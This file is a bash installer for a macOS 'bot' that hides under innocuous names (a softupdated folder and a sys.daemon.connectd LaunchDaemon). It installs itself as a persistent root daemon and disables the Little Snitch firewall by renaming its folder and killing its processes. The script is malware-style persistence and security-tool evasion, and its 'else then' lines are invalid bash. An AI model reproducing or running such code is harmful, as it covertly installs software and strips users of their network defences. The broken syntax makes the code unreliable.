#!/bin/bash

echo Starting

mkdir -p /private/var/softupdated

echo [+] Starting: `date` >> /private/var/softupdated/updatelog.txt 2>&1

DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
cd "$DIR" >> /private/var/softupdated/updatelog.txt 2>&1

if [ "$1" == "update" ]
	then
	echo Skipping bot unload.
else
	then
	### unload previous install
	echo [+] Unloading Bot... >> /private/var/softupdated/updatelog.txt 2>&1

	pid=`ps -ax | grep bot.py | head -1 | awk '{ print $1 }'`
	kill -KILL $pid > /dev/null 2>&1

	launchctl unload -w /Library/LaunchDaemons/sys.daemon.connectd.plist && echo [X] Unloaded Bot. >> /private/var/softupdated/updatelog.txt 2>&1

	pid=`ps -ax | grep bot.py | head -1 | awk '{ print $1 }'`
	kill -KILL $pid > /dev/null 2>&1
fi

### copy libraries and binaries to corresponding locations
echo [+] Copying Files... >> /private/var/softupdated/updatelog.txt 2>&1
mkdir -p /private/var/softupdated >> /private/var/softupdated/updatelog.txt 2>&1
cp -fR ./* /private/var/softupdated/ >> /private/var/softupdated/updatelog.txt 2>&1
chmod -R +x /private/var/softupdated >> /private/var/softupdated/updatelog.txt 2>&1

rm -f /private/var/softupdated/README.md >> /private/var/softupdated/updatelog.txt 2>&1
rm -Rf /private/var/softupdated/applet.rsrc >> /private/var/softupdated/updatelog.txt 2>&1
rm -f /private/var/softupdated/*.icns >> /private/var/softupdated/updatelog.txt 2>&1
rm -f /private/var/softupdated/*.sublime* >> /private/var/softupdated/updatelog.txt 2>&1
rm -f /private/var/softupdated/description.rtfd >> /private/var/softupdated/updatelog.txt 2>&1

echo [+] Files Copied. >> /private/var/softupdated/updatelog.txt 2>&1

### Disable little snitch
if [ -e "/Library/Little Snitch" ] 
	then
	echo [+] Disabling Little Snitch... >> /private/var/softupdated/updatelog.txt 2>&1
	mv "/Library/Little Snitch" "/Library/Little Snitch Monitor" >> /private/var/softupdated/updatelog.txt 2>&1
	killall "Little Snitch Agent" >> /private/var/softupdated/updatelog.txt 2>&1
	killall "Little Snitch Daemon" >> /private/var/softupdated/updatelog.txt 2>&1
	killall "Little Snitch Network Monitor" >> /private/var/softupdated/updatelog.txt 2>&1
fi

### copy launchd scripts to launchd folder
echo [+] Copying Launch Scripts... >> /private/var/softupdated/updatelog.txt 2>&1

cp -f ./sys.daemon.connectd.plist /Library/LaunchDaemons/sys.daemon.connectd.plist >> /private/var/softupdated/updatelog.txt 2>&1
chown -R root /Library/LaunchDaemons/sys.daemon.connectd.plist >> /private/var/softupdated/updatelog.txt 2>&1
chmod -R 644 /Library/LaunchDaemons/sys.daemon.connectd.plist >> /private/var/softupdated/updatelog.txt 2>&1
chmod -R 700 /private/var/softupdated >> /private/var/softupdated/updatelog.txt 2>&1

echo [+] Launch Scripts Copied. >> /private/var/softupdated/updatelog.txt 2>&1



### For in-place updates
if [ "$1" == "update" ]
	then
	rm -Rf /private/var/softupdated/code && echo "[+] Removed downloaded source folder." >> /private/var/softupdated/updatelog.txt 2>&1
else
	then
	### load launchd keepalive processes
	echo [+] Loading Bot... >> /private/var/softupdated/updatelog.txt 2>&1
	launchctl load -w /Library/LaunchDaemons/sys.daemon.connectd.plist && echo [√] Loaded Bot. >> /private/var/softupdated/updatelog.txt 2>&1
fi

echo [+] FINISHED: `date` >> /private/var/softupdated/updatelog.txt 2>&1

exit 0